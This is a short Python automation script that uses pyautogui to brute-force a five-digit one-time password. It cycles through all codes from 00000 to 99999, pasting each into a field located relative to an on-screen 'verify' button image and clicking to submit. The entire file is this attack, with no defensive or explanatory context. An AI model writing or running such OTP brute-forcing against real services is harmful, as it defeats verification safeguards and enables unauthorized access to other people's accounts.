import pyautogui as py
import pyperclip
import time
from utils import locate_image, locate_image_strong

duration =0.3
short = 0.2
print('---starting---')
time.sleep(1)
print('--- after sleeping ----')

for i in range(100000):
    otp = f"{i:05d}"
    print(f'--- {otp}')
    pyperclip.copy(otp)
    py.moveTo(locate_image("verifyButton.PNG"), duration=duration)
    py.moveRel(0,-70, duration=duration)
    py.click(clicks=3, interval=0.1)
    py.hotkey('ctrl', 'del')
    py.hotkey('ctrl', 'v')
    py.moveTo(locate_image("verifyButton.PNG"), duration=duration)
    py.click(duration=short)
    time.sleep(5)

